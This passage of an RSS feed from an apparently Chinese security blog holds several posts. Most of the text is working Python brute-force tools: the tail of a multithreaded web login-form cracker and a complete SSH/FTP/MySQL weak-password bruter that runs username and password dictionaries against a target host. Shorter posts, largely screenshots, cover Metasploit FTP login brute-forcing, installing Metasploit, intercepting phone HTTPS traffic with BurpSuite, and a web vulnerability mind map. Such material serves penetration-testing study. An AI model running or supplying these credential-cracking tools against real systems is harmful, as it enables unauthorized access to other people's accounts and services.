        # print self.result


def get_content(filename):
    data = []
    with open(filename) as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def get_queue(list1, list2):
    for user in list1:
        for pwd in list2:
            queue.put(user+&#39;:&#39;+pwd)

def main():
    parser = OptionParser()
    parser.add_option(&#39;-u&#39;,&#39;--url&#39;,dest=&#39;url&#39;,
                        help=&#39;Get target url&#39;)
    parser.add_option(&#39;-n&#39;,&#39;--fname&#39;,dest=&#39;fname&#39;,
                        help=&#39;The user name in the form&#39;)
    parser.add_option(&#39;-p&#39;,&#39;--fpass&#39;,dest=&#39;fpass&#39;,
                        help=&#39;The pass name in the form&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--namefile&#39;,dest=&#39;namefile&#39;,default=&#39;namefile.txt&#39;,
                        help=&#39;The user name dictionary files&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;passfile.txt&#39;,
                        help=&#39;The password dictionary files&#39;)
    (options,args) = parser.parse_args()

    if options.url and options.fname and options.fpass and options.namefile and options.passfile:
        users = []
        pwds = []
        users = get_content(options.namefile)
        pwds = get_content(options.passfile)
        get_queue(users, pwds)

        for x in xrange(1,41):
            blast = FormBlast(options, args, queue)
            blast.setDaemon(True)
            blast.start()
        queue.join()

        sleep(3)
        print &amp;quot;########################################&amp;quot;
        for x in result:
            print x
    else:
        parser.print_help()


if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;结果:ce6886490f9a6e6169f210150773b52d&#34;&gt;结果&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast1.png&#34; alt=&#34;表单爆破1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast2.png&#34; alt=&#34;表单爆破2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;脚本:584a532418a1844143552a4b9dd71035&#34;&gt;脚本&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;this script can bruter ftp/ssh/mysql&#39;

__author__ = &#39;reber&#39;

import Queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import paramiko
from ftplib import FTP
import MySQLdb

#################公有类#################
class CommonFun(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;)
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print &amp;quot;###################################################################&amp;quot;
            for x in rlist:
                self.show_log(lname,x)
        else:
            print &amp;quot;not found...&amp;quot;

#################SSH爆破模块#################
class SshBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for SshBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        self.is_exit = False
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):        
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(&#39;:&#39;)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                    self.qlist.put(name + &#39;:&#39; + pwd)
                    time.sleep(3)
                except Exception, e:
                    error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################FTP爆破模块#################
class FtpBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for FtpBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(1)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for MysqlBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db=&#39;mysql&#39;, port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(3)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

def main():
    parser = OptionParser(usage=&#39;Usage: python %prog [options] type&#39;)
    parser.add_option(&#39;-i&#39;,&#39;--host&#39;,dest=&#39;host&#39;,help=&#39;target ip&#39;)
    parser.add_option(&#39;-o&#39;,&#39;--timeout&#39;,type=int,dest=&#39;timeout&#39;,default=5,help=&#39;timeout&#39;)
    parser.add_option(&#39;-t&#39;,&#39;--thread&#39;,type=int,dest=&#39;threadnum&#39;,default=10,help=&#39;threadnum&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--userfile&#39;,dest=&#39;userfile&#39;,default=&#39;username.txt&#39;,help=&#39;userfile&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;password.txt&#39;,help=&#39;passfile&#39;)

    (options, args) = parser.parse_args()

    if not args:
        parser.print_help()
        exit()

    if args[0]==&#39;ssh&#39;:
        if options.host:
            ssh = SshBruter(options, args)
            ssh.run()
        else:
            parser.print_help()
    elif args[0]==&#39;ftp&#39;:
        if options.host:
            ftp = FtpBruter(options, args)
            ftp.run()
        else:
            parser.print_help()
    elif args[0]==&#39;mysql&#39;:
        if options.host:
            mysql = MysqlBruter(options, args)
            mysql.run()
        else:
            parser.print_help()
    else:
        print &amp;quot;type must be ssh or ftp or mysql&amp;quot;

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;尝试爆破:584a532418a1844143552a4b9dd71035&#34;&gt;尝试爆破&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_help.png&#34; alt=&#34;帮助信息.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ssh.png&#34; alt=&#34;爆破SSH.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ftp.png&#34; alt=&#34;爆破FTP.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_mysql.png&#34; alt=&#34;爆破MySQL.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit的简单使用</title>
      <link>http://wyb0.com/posts/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</guid>
      <description>

&lt;h3 id=&#34;0x00-启动:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x00 启动&lt;/h3&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_start.png&#34; alt=&#34;启动msf&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-metasploit的工作平台:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x01 Metasploit的工作平台&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;在msf里的工作平台可以保存历史的一些操作信息

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_workspace_h.png&#34; alt=&#34;msf工作平台的帮助信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_workspace.png&#34; alt=&#34;创建新的工作平台&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-使用db-nmap扫描主机:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x02 使用db_nmap扫描主机&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_nmap_lanou3g_ip.png&#34; alt=&#34;扫描lanou3g的ip信息&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&#34;扫描后的结果会保留在工作平台中-可以用hosts和services进行查看:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_hosts.png&#34; alt=&#34;查看主机列表&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_services.png&#34; alt=&#34;查看服务&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-使用msf的模块进行弱口令爆破:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;0x03 使用msf的模块进行弱口令爆破&lt;/h3&gt;

&lt;blockquote&gt;
&lt;h4 id=&#34;注-这里针对ftp服务进行弱口令测试:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;注：这里针对ftp服务进行弱口令测试&lt;/h4&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_services_p_21.png&#34; alt=&#34;查看都有那个主机开启了21端口&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_search_module.png&#34; alt=&#34;查找用于ftp爆破的模块&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_use_module_and_set.png&#34; alt=&#34;使用模块并设置参数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_use_show_options.png&#34; alt=&#34;查看设置的参数&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/msf_start_attack_ftp.png&#34; alt=&#34;开始攻击&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;h4 id=&#34;使用vulns可以查看结果-msf-auxiliary-ftp-login-vulns:5a9e5b832dc85eacc2ff860e6230e37a&#34;&gt;使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns&lt;/h4&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Ubuntu下安装Metasploit</title>
      <link>http://wyb0.com/posts/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85Metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85Metasploit/</guid>
      <description>

&lt;h3 id=&#34;0x00-安装metasploit:5ef2fdcf3f10108bc00e8ee0aa9fa263&#34;&gt;0x00 安装Metasploit&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;下载msfinstall脚本&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;修改文件权限&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ chmod 755 msfinstall
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装(时间较久)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./msfinstall
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x01-连接数据库:5ef2fdcf3f10108bc00e8ee0aa9fa263&#34;&gt;0x01 连接数据库&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先启动postgresql数据库&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ /etc/init.d/postgresql start #service postgresql start也可以
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;初始化MSF数据库(关键步骤)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ msfdb init
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;运行msfconsole&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在msf中查看数据库连接状态&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf &amp;gt; db_status
#若出现错误：Module database cache not built yet, using slow search
#则重新构建缓存，缓存构建通常需要5-10分钟左右。
#构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块
msf &amp;gt; db_rebuild_cache
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>BurpSuite抓手机包</title>
      <link>http://wyb0.com/posts/BurpSuite%E6%8A%93%E6%89%8B%E6%9C%BA%E5%8C%85/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/BurpSuite%E6%8A%93%E6%89%8B%E6%9C%BA%E5%8C%85/</guid>
      <description>

&lt;h3 id=&#34;0x00-环境设置:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x00 环境设置&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Windows Phone手机和电脑处于同一无线环境下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_pc_ip.png&#34; alt=&#34;PC机的ip&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_ip_set.png&#34; alt=&#34;IP设置&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-burpsuite设置:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x01 BurpSuite设置&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_set_phone_proxy1.png&#34; alt=&#34;设置burpsuite抓8888端口的包1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_set_phone_proxy2.png&#34; alt=&#34;设置burpsuite抓8888端口的包2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-抓http包:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x02 抓HTTP包&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_phone_visit_internet.png&#34; alt=&#34;手机访问网络&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_get_phone_packet.png&#34; alt=&#34;burpsuite抓手机包&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-抓https包:39a16c0b1f7c33b2e8e1623fba930241&#34;&gt;0x03 抓HTTPS包&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;挂burpsuite的代理下载证书

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_down_ca1.png&#34; alt=&#34;下载证书1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_down_ca2.png&#34; alt=&#34;下载证书2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书&lt;br /&gt;
安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_phone_install_ca.png&#34; alt=&#34;手机安装证书&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;抓https数据包

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_get_https_packet1.png&#34; alt=&#34;手机访问https链接&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/burpsuite_get_https_packet2.png&#34; alt=&#34;burpsuite抓https包&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>http://wyb0.com/posts/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E8%84%91%E5%9B%BE/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E8%84%91%E5%9B%BE/</guid>
      <description>

&lt;h2 id=&#34;web常见漏洞:7d643aebd88a95b82f61f5520b7a5043&#34;&gt;Web常见漏洞&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/web_common_vulnerability_maps.png&#34; alt=&#34;Web常见漏洞.png&#34;&gt;
&lt;/div&gt;

</description>
    </item>
    
  </channel>
</rss>